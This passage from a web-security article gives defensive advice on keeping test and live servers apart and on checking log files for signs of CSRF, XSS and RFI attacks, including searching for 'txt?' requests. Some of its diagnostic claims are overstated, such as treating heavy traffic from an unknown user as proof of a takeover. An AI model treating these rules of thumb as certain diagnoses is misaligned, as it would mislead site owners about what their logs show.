It is also not a good idea to use the same server to test things and run a live product. Use one server as a test platform for playing around and another for grown-up stuff. It is especially important to have a different domain for each to protect your cookies.

## Check Your Log Files

Every server comes with log files that you can access. Many hosting companies even give you detailed statistics that show you where visitors have gone and what they did.

Normally, we just use these to check the number of visitors, what browsers they used, where they came from, when they came and which websites were most successful. This is what makes us happy and allows us to track our progress.

That is not really the interesting part of the statistics package or log files, though:

- Check how many forms have been sent and who tried to send them. This is an indicator of CSRF and XSS attacks.
- Check the server traffic and which files were frequently called. If the forms are old and not frequently used, you have a CSRF attack on your hands.
- Search the logs for "txt?" endings, which are an indicator of RFI attacks. Try them out on your website; if they work, alarm bells should go off in your head. An exception to this is _robots.txt_, which is a file that search engines request before reading a folder; this is not an issue and wouldn’t be followed by a question mark anyway.
- Check the error messages and how many of them were 404 errors ("Page not found"). Check what file names people were looking for, which folders they attempted to access and what files they tried to read.
- Check which users tried to authenticate. If a user you don’t know was causing a lot of traffic, they already got control of your server.

Your log file is your snitch that tells on the bad guys who come around trying to mess with your server. Be wise and stay a step ahead of them.

## Further Reading on SmashingMag:

- [10 Ways To Beef Up Your Website’s Security](https://www.smashingmagazine.com/2010/06/10-ways-to-beef-up-your-websites-security/)
- [Common Security Mistakes in Web Applications](https://www.smashingmagazine.com/2010/10/common-security-mistakes-in-web-applications/)
- [Content Security Policy, Your Future Best Friend](https://www.smashingmagazine.com/2016/09/content-security-policy-your-future-best-friend/)
- [Common WordPress Malware Infections](https://www.smashingmagazine.com/2012/10/four-malware-infections-wordpress/)

## Want To Know More?

If you want to know more about the subject, here are some presentations and resources. Please add more in the comments if you know of good ones.

- VirtualForge has some very nice video tutorials explaining different security threats.
- Simon Willison has a [good SlideShare presentation on security fundamentals](https://www.slideshare.net/simon/when-ajax-attacks-web-application-security-fundamentals-presentation). He is also a prolific curator of security-related news.
- Things That Go Bump on the Web was my first security talk, given at last year’s Web Directions North. This is the video, and [here is the slidedeck that goes with it](https://www.slideshare.net/cheilmann/web-application-security-990546).
- [Basic Housekeeping: Plugging Obvious Security Holes In Websites](https://www.wait-till-i.com/2009/10/13/liberte-accessibilite-and-securite-that-was-paris-web-2009/) was my security-related talk at last year’s Paris Web conference, covering a lot of what I’ve talked about here in detail.

{{< signature "al, lu, il" >}}
